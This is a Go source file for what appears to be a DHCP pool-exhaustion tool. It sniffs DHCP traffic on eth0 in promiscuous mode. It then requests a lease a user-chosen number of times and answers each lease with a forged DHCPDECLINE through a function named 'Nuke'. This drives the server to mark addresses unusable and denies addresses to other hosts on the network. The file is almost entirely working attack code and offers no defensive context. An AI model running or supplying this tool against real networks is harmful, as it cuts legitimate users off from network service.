package main

import (
	"crypto/rand"
	"fmt"
	"github.com/d2g/dhcp4"
	"github.com/d2g/dhcp4client"
	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
	"log"
	"net"
	"os"
	"strconv"
)

func sniff() {

	if handle, err := pcap.OpenLive("eth0", 1600, true, pcap.BlockForever); err != nil {
		panic(err)
	} else if err := handle.SetBPFFilter("udp and (port 68 or port 67)"); err != nil { // optional
		panic(err)
	} else {
		packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
		for packet := range packetSource.Packets() {
			handlePacket(packet) // Do something with a packet here.
		}
	}
}
func handlePacket(packet gopacket.Packet) {
	var eth layers.Ethernet
	var ip4 layers.IPv4
	var udp layers.UDP
	var payload gopacket.Payload
	parser := gopacket.NewDecodingLayerParser(layers.LayerTypeEthernet, &eth, &ip4, &udp, &payload)
	decoded := []gopacket.LayerType{}

	err := parser.DecodeLayers(packet.Data(), &decoded)
	if err != nil {
		log.Printf("Decoding error:%v\n", err)
	}
	for _, layerType := range decoded {
		switch layerType {
		case layers.LayerTypeEthernet:
			fmt.Println("    Eth ", eth.SrcMAC, eth.DstMAC)
		case layers.LayerTypeIPv4:
			fmt.Println("    IP4 ", ip4.SrcIP, ip4.DstIP)
		case layers.LayerTypeUDP:
			fmt.Println("    UDP ", udp.SrcPort, udp.DstPort, payload.GoString())
		}

	}
}
func main() {
	go sniff()
	if len(os.Args) == 1 {
		log.Fatalln("You didn't gave to me how times i have to perform this action")
		os.Exit(1)
	}
	toNuke := os.Args[1]
	myIP := net.ParseIP(os.Args[2])
	dhcpServer := net.ParseIP(os.Args[3])
	myMAC := os.Args[4]
	Times, _ := strconv.Atoi(toNuke)
	m, err := net.ParseMAC(myMAC)
	if err != nil {
		log.Printf("MAC Error:%v\n", err)
	}
	c, err := dhcp4client.NewInetSock(dhcp4client.SetLocalAddr(net.UDPAddr{IP: myIP, Port: 68}), dhcp4client.SetRemoteAddr(net.UDPAddr{IP: dhcpServer, Port: 67}))
	exampleClient, err := dhcp4client.New(dhcp4client.HardwareAddr(m), dhcp4client.Connection(c), dhcp4client.Broadcast(false))

	defer func() {
		if err != nil {
			exampleClient.Close()
		}
	}()

	for j := 1; j <= Times; j++ {

		ip := RequestIP(exampleClient)
		log.Println(ip)

		ipv4 := net.ParseIP(ip.YIAddr().String())
		//Nuke(ip)
		//Nuke(exampleClient, m, net.ParseIP("192.168.1.243"))
		Nuke(exampleClient, m, ipv4, ip)
	}
}

func inc(ip net.IP) {
	for j := len(ip) - 1; j >= 0; j-- {
		ip[j]++
		if ip[j] > 0 {
			break
		}
	}
}

func Nuke(exampleClient *dhcp4client.Client, m net.HardwareAddr, ip net.IP, ack dhcp4.Packet) {
	var err error
	_, err = SendDHCPDeclinePacket(exampleClient, m, ip, ack)
	if err != nil {
		log.Fatalf("Couldn't send DeclinePacket:" + err.Error())
	} else {
		log.Println("Sent nuke for " + ip.String())
	}

}

func DHCPDeclinePacket(hw net.HardwareAddr, ip net.IP, acknowledgement dhcp4.Packet) dhcp4.Packet {
	messageid := make([]byte, 4)
	if _, err := rand.Read(messageid); err != nil {
		panic(err)
	}
	acknowledgementOptions := acknowledgement.ParseOptions()

	packet := dhcp4.NewPacket(dhcp4.BootRequest)
	packet.SetCHAddr(hw)
	packet.SetCIAddr(ip)

	packet.SetXId(messageid)
	packet.SetBroadcast(false)

	packet.AddOption(dhcp4.OptionDHCPMessageType, []byte{byte(dhcp4.Decline)})
	packet.AddOption(dhcp4.OptionServerIdentifier, acknowledgementOptions[dhcp4.OptionServerIdentifier])

	return packet
}

func SendDHCPDeclinePacket(c *dhcp4client.Client, hw net.HardwareAddr, ip net.IP, acknowledgement dhcp4.Packet) (dhcp4.Packet, error) {
	DeclinePacket := DHCPDeclinePacket(hw, ip, acknowledgement)
	DeclinePacket.PadToMinSize()

	return DeclinePacket, c.SendPacket(DeclinePacket)
}

func RequestIP(exampleClient *dhcp4client.Client) dhcp4.Packet {

	// discoveryPacket, _ := exampleClient.SendDiscoverPacket()
	// log.Println("Packet:%v\n", discoveryPacket)

	// offerPacket, _ := exampleClient.GetOffer(&discoveryPacket)
	// log.Println("Packet:%v\n", offerPacket)
	// log.Println("OFFERED:" + offerPacket.YIAddr().String())
	//return offerPacket.YIAddr().String()
	//requestPacket, _ := exampleClient.SendRequest(&offerPacket)
	//log.Println("Packet:%v\n", requestPacket)

	success, acknowledgementpacket, err := exampleClient.Request()
	if err != nil {
		networkError, ok := err.(*net.OpError)
		if ok && networkError.Timeout() {
			log.Println("Test Skipping as it didn't find a DHCP Server")
		}
		log.Println("Error:%v\n", err)
	}
	log.Println("Success:%v\n", success)
	log.Println("Packet:%v\n", acknowledgementpacket)

	return acknowledgementpacket

	// if !success {
	// 	log.Fatalln("We didn't sucessfully get a DHCP Lease?")
	// } else {
	// 	log.Printf("IP Received:%v\n", acknowledgementpacket.YIAddr().String())
	// 	return acknowledgementpacket.YIAddr().String()
	// }
}
